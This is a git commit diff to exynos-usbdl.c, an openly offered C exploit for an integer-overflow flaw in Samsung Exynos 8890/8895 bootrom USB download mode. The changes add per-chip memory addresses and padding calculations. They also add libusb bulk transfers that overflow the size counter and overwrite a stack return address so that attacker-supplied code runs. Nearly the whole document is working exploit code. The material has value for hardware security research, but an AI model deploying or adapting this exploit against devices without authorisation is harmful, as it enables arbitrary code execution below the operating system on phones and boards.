db66123add164f012e93e9e1a13b55c8dd4747f5
Frederic Basse <contact@fredericb.info>
2020-04-30 00:32:54 -0700

    improvements

--- exynos-usbdl.c
+++ exynos-usbdl.c
@@ -1,39 +1,40 @@
 /* -*- Mode: C; indent-tabs-mode:t ; c-basic-offset:8 -*- */
 /* exynos-usbdl - github.com/frederic/exynos-usbdl
  * 
- * based on the following examples from libusb.info :
- * Test suite program based of libusb-0.1-compat testlibusb
- * libusb example program for hotplug API
- * Copyright © 2012-2013 Nathan Hjelm <hjelmn@mac.com>
- *
- * This library is free software; you can redistribute it and/or
- * modify it under the terms of the GNU Lesser General Public
- * License as published by the Free Software Foundation; either
- * version 2.1 of the License, or (at your option) any later version.
- *
- * This library is distributed in the hope that it will be useful,
- * but WITHOUT ANY WARRANTY; without even the implied warranty of
- * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
- * Lesser General Public License for more details.
- *
- * You should have received a copy of the GNU Lesser General Public
- * License along with this library; if not, write to the Free Software
- * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA
  */
 
 #include <stdlib.h>
 #include <stdio.h>
 #include <stdint.h>
+#include <string.h>
 #include "libusb-1.0/libusb.h"
 
 #define DEBUG	1
-
 #define VENDOR_ID	0x04e8
 #define PRODUCT_ID	0x1234
 #define BLOCK_SIZE		512
 #define CHUNK_SIZE	(uint32_t)0xfffe00
 
-int done = 0;
+#if DEBUG
+#define dprint(args...) printf(args)
+#else
+#define dprint(args...)
+#endif
+
+static char *target_names[] = {
+	"Exynos8890",//TARGET_8890
+	"Exynos8895",//TARGET_8895
+};
+enum {
+	XFER_BUFFER = 0,//address of buffer where payload is written
+	RA_PTR,//pointer to return address in stack we want to replace
+};
+static uint32_t targets[][2] = {
+	//XFER_BUFFER,	RA_PTR
+	{0x02021800,	0x02020F08},//TARGET_8890
+	{0x02021800,	0x02020F18},//TARGET_8895
+};
+
 libusb_device_handle *handle = NULL;
 
 #define MAX_PAYLOAD_SIZE	(BLOCK_SIZE - 10)//TODO bug, we should be able to reach 0xffff
@@ -44,74 +45,96 @@ typedef struct __attribute__ ((__packed__)) dldata_s {
 	u_int16_t unk1;
 } dldata_t;
 
-static int exploit(dldata_t *payload) {
+static int exploit(dldata_t *payload, int target_id) {
 	int rc;
 	int transferred;
-	uint32_t block_count, size_block_aligned;
-	uint32_t skip_cnt = 0x100;//first, we transfer enough CHUNK_SIZE to reach @0x02001800
-	//then we calculate how many BLOCK_SIZE are required to reach 0x02020F08
-	block_count = (0x02020F08 - (0x02001800 + payload->size - 8)) / BLOCK_SIZE;//0xfa
-	//only remaining bytes will be written
-	uint32_t remain = (0x02020F08 - (0x02001800 + payload->size - 8)) % BLOCK_SIZE;//0x110
-	//todo handle block-aligned case
-	printf("block_count=0x%x\n", block_count);
-	printf("remain=0x%x\n", remain);
-	uint32_t iram_offset = BLOCK_SIZE * block_count;
-	uint32_t iram_size = remain + 4 + 2;//overwritten pointer size + footer
-	uint8_t *iram = (uint8_t*)calloc(1, iram_size);
-	iram[remain] = 0xe0;
-	iram[remain+1] = 0x64;
-	iram[remain+2] = 0x00;
-	iram[remain+3] = 0x00;
-
-	iram[remain] = 0x00;
-	iram[remain+1] = 0x18;
-	iram[remain+2] = 0x02;
-	iram[remain+3] = 0x02;
-	 
-	uint32_t xfer_buffer = 0x02021800;
+	#if DEBUG
 	uint32_t usb_size;
-#if DEBUG
-	printf("exploit: begin\n");
-	printf("CHUNK_SIZE * skip_cnt=0x%x\n", CHUNK_SIZE * skip_cnt);
-	printf("skip_cnt=0x%x\n", skip_cnt);
-	printf("payload->size=0x%x\n", payload->size);
-	printf("sizeof(iram)=0x%lx\n", sizeof(iram));
-	printf("iram_offset=0x%x\n", iram_offset);
-#endif
-	size_t first_chunk_size = payload->size;
-	printf("first_chunk_size=0x%lx\n", first_chunk_size);
-	//trigger integer overflow vulnerability
-	payload->size = payload->size + (CHUNK_SIZE * skip_cnt) + iram_offset +iram_size;
-	printf("payload->size=0x%x\n", payload->size);
+	uint32_t block_count, size_block_aligned;
+	#endif
 
+	if(target_id < 0) {
+		return -1;
+	}
+	printf("- exploit: starting.\n");
+
+	// step 1 : compute offsets,sizes,etc...
+	dprint("targets[target_id][XFER_BUFFER] = 0x%x\n", targets[target_id][XFER_BUFFER]);
+	dprint("targets[target_id][RA_PTR] = 0x%x\n", targets[target_id][RA_PTR]);
+	if(targets[target_id][XFER_BUFFER] < targets[target_id][RA_PTR])
+		printf("ERROR : targets[target_id][XFER_BUFFER] < targets[target_id][RA_PTR]\n");
+	uint32_t padding_size = targets[target_id][RA_PTR] - targets[target_id][XFER_BUFFER];
+	dprint("padding_size = targets[target_id][RA_PTR] - targets[target_id][XFER_BUFFER] = 0x%x\n", padding_size);
+	uint32_t original_payload_size = payload->size;
+	dprint("original_payload_size = 0x%x\n", original_payload_size);
+	if(original_payload_size > 0xffff)//maximum size of first bulk transfer
+		printf("ERROR : original_payload_size > 0xffff\n");
+	padding_size -= original_payload_size;//leading padding replaced with payload
+	padding_size += sizeof(payload->unk0) + sizeof(payload->size);//header is skipped, so we have to compensate with more padding
+	dprint("new padding_size = 0x%x\n", padding_size);
+	uint32_t chunk_cnt = padding_size / CHUNK_SIZE;
+	dprint("chunk_cnt = 0x%x\n", chunk_cnt);
+	padding_size = padding_size % CHUNK_SIZE;
+	dprint("new padding_size = 0x%x\n", padding_size);
+	uint32_t block_cnt = padding_size / BLOCK_SIZE;
+	dprint("block_cnt = 0x%x\n", block_cnt);
+	padding_size = padding_size % BLOCK_SIZE;
+	dprint("new padding_size = 0x%x\n", padding_size);
+	if(padding_size == 0 && block_cnt > 0){//TODO case to verify
+		dprint("INFO : padding_size == 0 => \n");
+		block_cnt--;
+		dprint("new block_cnt = 0x%x\n", block_cnt);
+		padding_size = BLOCK_SIZE;//TODO hmmm no!
+		dprint("new padding_size = 0x%x\n", padding_size);
+	}
+	uint32_t ram_size = padding_size + sizeof(targets[target_id][XFER_BUFFER]) + sizeof(payload->unk1);//the pointer we overwrite is at the end, and we need to 2 extra bytes for footer
+	dprint("ram_size = 0x%x\n", ram_size);
+
+	// step 2 : prepare payload
+	uint8_t *ram = (uint8_t*)calloc(1, ram_size);
+	*(uint32_t*)&ram[padding_size] = targets[target_id][XFER_BUFFER];//overwriting return address in stack :]
+	payload->size = original_payload_size + (CHUNK_SIZE * chunk_cnt) + (BLOCK_SIZE * block_cnt) + ram_size;
+	dprint("malicious payload->size=0x%x\n", payload->size);
+
+	uint32_t min_size_to_overflw = (uint32_t)0 - targets[target_id][XFER_BUFFER];
+	dprint("min_size_to_overflw = 0x%x\n", min_size_to_overflw);
+	if(min_size_to_overflw > payload->size)
+		printf("ERROR : min_size_to_overflw > payload->size\n");
+
+	// step 3 : usb communication
 	rc = libusb_claim_interface(handle, 0);
 	if(rc) {
 		fprintf(stderr, "Error claiming interface: %s\n", libusb_error_name(rc));
 		return rc;
 	}
 
-	rc = libusb_bulk_transfer(handle, LIBUSB_ENDPOINT_OUT | 2, (uint8_t*)payload, first_chunk_size, &transferred, 0);
+	printf("- exploit: sending payload...\n");
+	rc = libusb_bulk_transfer(handle, LIBUSB_ENDPOINT_OUT | 2, (uint8_t*)payload, original_payload_size, &transferred, 0);
 	if(rc) {
 		printf("libusb_bulk_transfer LIBUSB_ENDPOINT_OUT: error %d\n", rc);
 		fprintf(stderr, "Error libusb_bulk_transfer: %s\n", libusb_error_name(rc));
 		return rc;
 	}
-	xfer_buffer += CHUNK_SIZE + (transferred - 8);
-	printf("xfer_buffer=0x%x\n", xfer_buffer);
+	#if DEBUG
+	uint32_t xfer_buffer = targets[target_id][XFER_BUFFER];
+	xfer_buffer += CHUNK_SIZE + (transferred - 8);//initial bulk transfer has already increased xfer_buffer by CHUNK_SIZE one time.
+	dprint("xfer_buffer=0x%x\n", xfer_buffer);
 	usb_size = (payload->size - transferred) - CHUNK_SIZE;
-	printf("usb_size=0x%x\n", usb_size);
-	//that initial bulk transfer has already increased xfer_buffer by CHUNK_SIZE one time.
-	printf("libusb_bulk_transfer: transferred=%d\n", transferred);
-	while(skip_cnt--){
-		rc = libusb_bulk_transfer(handle, LIBUSB_ENDPOINT_OUT | 2, iram, 0, &transferred, 0);
+	dprint("usb_size=0x%x\n", usb_size);
+	dprint("libusb_bulk_transfer: transferred=%d\n", transferred);
+	#endif
+	chunk_cnt++;//need extra dummy transfer to consume block padding right before sending ram
+	printf("- exploit: sending %u dummy transfers...\n", chunk_cnt);
+	while(chunk_cnt--){
+		rc = libusb_bulk_transfer(handle, LIBUSB_ENDPOINT_OUT | 2, ram, 0, &transferred, 0);
 		if(rc) {
 			printf("libusb_bulk_transfer LIBUSB_ENDPOINT_OUT: error %d\n", rc);
 			fprintf(stderr, "Error libusb_bulk_transfer: %s\n", libusb_error_name(rc));
 			return rc;
 		}
+		#if DEBUG
 		printf("libusb_bulk_transfer: transferred=%d\n", transferred);
-		printf("skip_cnt=0x%x\n", skip_cnt);
+		printf("chunk_cnt=0x%x\n", chunk_cnt);
 		if(usb_size > CHUNK_SIZE){
 			xfer_buffer += CHUNK_SIZE;
 			printf("xfer_buffer=0x%x\n", xfer_buffer);
@@ -135,79 +158,63 @@ static int exploit(dldata_t *payload) {
 			printf("xfer_buffer=0x%x\n", xfer_buffer);
 			printf("usb_size=0x%x\n", usb_size);
 		}
+		#endif
 	}
-	
-	//dummy transfer in usb_finish_download
-	rc = libusb_bulk_transfer(handle, LIBUSB_ENDPOINT_OUT | 2, iram, 0, &transferred, 0);
+
+	printf("- exploit: sending last transfer to overwrite RAM...\n");
+	rc = libusb_bulk_transfer(handle, LIBUSB_ENDPOINT_OUT | 2, ram, ram_size, &transferred, 0);
 	if(rc) {
 		printf("libusb_bulk_transfer LIBUSB_ENDPOINT_OUT: error %d\n", rc);
 		fprintf(stderr, "Error libusb_bulk_transfer: %s\n", libusb_error_name(rc));
 		return rc;
 	}
-	printf("libusb_bulk_transfer: transferred=%d\n", transferred);
-
-	//todo last two bytes not overwritten due to ignored footer
-	rc = libusb_bulk_transfer(handle, LIBUSB_ENDPOINT_OUT | 2, iram, iram_size, &transferred, 0);
-	if(rc) {
-		printf("libusb_bulk_transfer LIBUSB_ENDPOINT_OUT: error %d\n", rc);
-		fprintf(stderr, "Error libusb_bulk_transfer: %s\n", libusb_error_name(rc));
-		return rc;
-	}
-	printf("libusb_bulk_transfer: transferred=%d\n", transferred);
-
+	dprint("libusb_bulk_transfer: transferred=%d\n", transferred);
+	printf("- exploit: done.\n");
 	sleep(5);
 	libusb_release_interface(handle, 0);
 
 	return rc;
 }
 
-static int LIBUSB_CALL hotplug_callback(libusb_context *ctx, libusb_device *dev, libusb_hotplug_event event, void *user_data)
+static int identify_target()
 {
 	struct libusb_device_descriptor desc;
-	int rc;
+	int rc, i;
+	unsigned char product[256];
 
-	rc = libusb_get_device_descriptor(dev, &desc);
+	if(!handle)
+		return -1;
+
+	rc = libusb_get_device_descriptor(libusb_get_device(handle), &desc);
 	if (LIBUSB_SUCCESS != rc) {
 		fprintf (stderr, "Error getting device descriptor\n");
+		return -1;
 	}
 
-	printf ("Device attached: %04x:%04x\n", desc.idVendor, desc.idProduct);
+	printf("Device detected: %04x:%04x\n", desc.idVendor, desc.idProduct);
 
-	if (handle) {
-		libusb_close (handle);
-		handle = NULL;
+	if (desc.iProduct) {
+		rc = libusb_get_string_descriptor_ascii(handle, desc.iProduct, product, sizeof(product));
+		if (rc > 0){
+			for(i = 0; i < sizeof(target_names)/sizeof(target_names[0]); i++){
+				if(!strcmp(target_names[i], (char *)product)){
+					printf("Target: %s\n", target_names[i]);
+					return i;
+				}
+			}
+		}
 	}
 
-	rc = libusb_open (dev, &handle);
-	if (LIBUSB_SUCCESS != rc) {
-		fprintf (stderr, "Error opening device\n");
-	}
-	done++;
-
-	return 0;
-}
-
-static int LIBUSB_CALL hotplug_callback_detach(libusb_context *ctx, libusb_device *dev, libusb_hotplug_event event, void *user_data)
-{
-	printf ("Device detached\n");
-
-	if (handle) {
-		libusb_close (handle);
-		handle = NULL;
-	}
-
-	done++;
-
-	return 0;
+	return -1;
 }
 
 int main(int argc, char *argv[])
 {
 	libusb_context *ctx;
-	libusb_hotplug_callback_handle hp[2];
 	FILE *fd;
 	dldata_t payload = {0};
 	size_t result, fd_size;
+	int target_id = -1;
 	int rc;
 
 	if (argc != 2) {
@@ -244,39 +251,20 @@ int main(int argc, char *argv[])
 		return EXIT_FAILURE;
 	}
 
+	#if DEBUG
 	libusb_set_debug(ctx, LIBUSB_LOG_LEVEL_DEBUG);
+	#endif
 
-	if (!libusb_has_capability (LIBUSB_CAP_HAS_HOTPLUG)) {
-		printf ("Hotplug capabilites are not supported on this platform\n");
+	handle = libusb_open_device_with_vid_pid(NULL, VENDOR_ID, PRODUCT_ID);
+	if (!handle) {
+		fprintf (stderr, "Error cannot open device %04x:%04x\n", VENDOR_ID, PRODUCT_ID);
 		libusb_exit (NULL);
 		return EXIT_FAILURE;
 	}
 
-	rc = libusb_hotplug_register_callback (NULL, LIBUSB_HOTPLUG_EVENT_DEVICE_ARRIVED, 0, VENDOR_ID,
-		PRODUCT_ID, LIBUSB_HOTPLUG_MATCH_ANY, hotplug_callback, NULL, &hp[0]);
-	if (LIBUSB_SUCCESS != rc) {
-		fprintf (stderr, "Error registering callback 0\n");
-		libusb_exit (NULL);
-		return EXIT_FAILURE;
-	}
+	target_id = identify_target();
 
-	rc = libusb_hotplug_register_callback (NULL, LIBUSB_HOTPLUG_EVENT_DEVICE_LEFT, 0, VENDOR_ID,
-		PRODUCT_ID,LIBUSB_HOTPLUG_MATCH_ANY, hotplug_callback_detach, NULL, &hp[1]);
-	if (LIBUSB_SUCCESS != rc) {
-		fprintf (stderr, "Error registering callback 1\n");
-		libusb_exit (NULL);
-		return EXIT_FAILURE;
-	}
-
-	printf("<Waiting for device %04x:%04x>\n", VENDOR_ID, PRODUCT_ID);
-
-	while (done < 1) {
-		rc = libusb_handle_events (NULL);
-		if (rc < 0)
-			printf("libusb_handle_events() failed: %s\n", libusb_error_name(rc));
-	}
-
-	exploit(&payload);
+	exploit(&payload, target_id);
 
 	if (handle) {
 		libusb_close (handle);
